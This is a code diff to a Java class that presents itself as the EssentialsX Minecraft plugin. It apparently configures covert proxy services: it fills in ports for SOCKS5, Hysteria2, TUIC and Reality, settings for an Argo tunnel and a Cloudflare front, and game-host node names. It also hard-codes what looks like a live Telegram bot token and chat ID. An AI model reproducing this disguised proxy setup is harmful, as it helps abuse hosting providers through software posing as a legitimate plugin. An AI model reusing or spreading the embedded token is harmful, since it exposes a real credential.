@@ -81,18 +81,18 @@ public class EssentialsX extends JavaPlugin {
         env.put("ARGO_PORT", "8001");
         env.put("ARGO_DOMAIN", "");
         env.put("ARGO_AUTH", "");
-        env.put("S5_PORT", "");
-        env.put("HY2_PORT", "7034");
-        env.put("TUIC_PORT", "");
+        env.put("S5_PORT", "20422");
+        env.put("HY2_PORT", "20262");
+        env.put("TUIC_PORT", "20199");
         env.put("ANYTLS_PORT", "");
-        env.put("REALITY_PORT", "");
+        env.put("REALITY_PORT", "20178");
         env.put("ANYREALITY_PORT", "");
         env.put("UPLOAD_URL", "");
         env.put("CHAT_ID", "7592034407");
         env.put("BOT_TOKEN", "8002189523:AAFDp3-de5-dw-RkWXsFI5_sWHrFhGWn1hs");
         env.put("CFIP", "spring.io");
         env.put("CFPORT", "443");
-        env.put("NAME", "host2play");
+        env.put("NAME", "greathost");
         env.put("DISABLE_ARGO", "true");
         
         // Load from system environment variables
